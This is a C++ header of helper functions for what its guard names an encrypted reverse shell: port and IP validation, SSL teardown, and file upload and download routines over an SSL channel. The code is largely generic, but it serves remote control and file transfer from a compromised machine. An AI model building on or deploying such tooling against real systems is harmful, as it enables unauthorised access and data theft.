#ifndef ENCRYPTED_REV_SHELL_UTILS_H
#define ENCRYPTED_REV_SHELL_UTILS_H

#include <algorithm>
#include <cmath>
#include <complex>
#include <cstring>
#include <iostream>
#include <fstream>

#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <pty.h>
#include <vector>
#include <openssl/ssl.h>
#include <openssl/err.h>

struct fileTransfer {
    std::string type;
    std::string pathToRead;
    std::string pathToWrite;
};

inline char* toLower(char* arg) {

    //convert to string
    std::string inputStr = arg;

    // loop through and covert to lower char
    std::transform(inputStr.begin(), inputStr.end(), inputStr.begin(),
    [](unsigned char c){ return std::tolower(c); });

    //convert back to char array
    char* returnChar = new char[inputStr.length() + 1];
    strcpy(returnChar, inputStr.c_str());

    return returnChar;
}


inline bool isPort(char* arg) {
    std::string inputStr = arg;

    if ( std::all_of(inputStr.begin(), inputStr.end(),
                     [](unsigned char c) { return std::isdigit(c); })) {
        int inputNum = std::stoi(inputStr);

        if ( inputNum >= 1 && inputNum <= 65535) {
            return true;
        }
        else {
            return false;
        }
    }
    return false;

}

inline bool checkIfIpAddr(char* arg) {
    unsigned char buf[sizeof(struct in_addr)];

    int check = inet_pton(AF_INET, arg, buf);

    if (check <= 0) {
        return false;
    }
    else {
        return true;
    }
}

inline void safeShutdown(const std::string& msgToSnd, const int socket, const int socket_fd, SSL* ssl,  SSL_CTX* ctx) {
    std::cout << msgToSnd << std::endl;
    const char *message = msgToSnd.c_str();
    send(socket, message, strlen(message), 0);
    close(socket);
    close(socket_fd);
    SSL_free(ssl);
    SSL_CTX_free(ctx);
    exit(EXIT_FAILURE);
}
// Function returns the file path of the file we want as an std::string

inline std::vector<std::byte> readFileAsByteVector(const std::string& filePath) {
    std::ifstream inputFile(filePath, std::ios::binary | std::ios::ate);

    if (!inputFile) {
        std::cout << "[!] Error opening file " << filePath << std::endl;
        return {};
    }

    std::streamsize fileSize = inputFile.tellg();
    inputFile.seekg(0, std::ios::beg);

    std::vector<std::byte> fileBuffer (fileSize);

    if (!inputFile.read(reinterpret_cast<char*>(fileBuffer.data()), fileSize)) {
        std::cout << "[!] Error reading file " << filePath << std::endl;
    }

    inputFile.close();

    return fileBuffer;
}

inline bool writeBytesToFile(std::vector<std::byte> fileBuffer, const std::string& filePath) {
    std::ofstream outputFile(filePath, std::ios::binary | std::ios::ate);

    if (!outputFile) {
        std::cout << "[!] Error opening file " << filePath << std::endl;
        return false;
    }

    if (!outputFile.write(reinterpret_cast<char*>(fileBuffer.data()), fileBuffer.size())) {
        std::cout << "[!] Error writing file " << filePath << std::endl;
        return false;
    }
    return true;
}

inline std::vector<std::byte> handleIncomingFile(SSL* ssl) {
    //read the file size
    uint32_t fileSize = 0;
    SSL_read(ssl, &fileSize, sizeof(fileSize));
    // convert from network byte order to host byte order
    // again to improve compatibility
    fileSize = ntohl(fileSize);

    // read the actual file data
    std::vector<std::byte> fileBuffer (fileSize);
    size_t totalRead = 0;

    // loop through and wait until we have the entire file
    while (totalRead < fileSize) {
        int bytesRead = SSL_read(ssl, reinterpret_cast<char*>(fileBuffer.data() + totalRead), fileSize - totalRead);

        if (bytesRead <= 0) {
            std::cout << "Failed to read Incoming File!!" << std::endl;
            break;
        }

        totalRead += bytesRead;
    }

    return fileBuffer;
}

inline void prepareAndUpload(SSL* ssl, const std::vector<std::byte>& fileBuffer, const std::string& command, const std::string& pathToWrite) {

    // send the command we want to use so the server/client knows what to expect(upload/download)
    SSL_write(ssl, command.c_str(), command.size());

    // we also want to send the path it needs to be written to
    SSL_write(ssl, pathToWrite.c_str(), pathToWrite.size());

    // get the file size
    auto fileSize = static_cast<uint32_t>(fileBuffer.size());
    // convert to byte order for compatibility
    fileSize = htonl(fileSize);
    // tell the server/client the size of the file so that it is wanted to be sent.
    SSL_write(ssl, &fileSize, sizeof(fileSize));

    // finally send the file
    SSL_write(ssl, fileBuffer.data(), fileBuffer.size());
}

#endif //ENCRYPTED_REV_SHELL_UTILS_H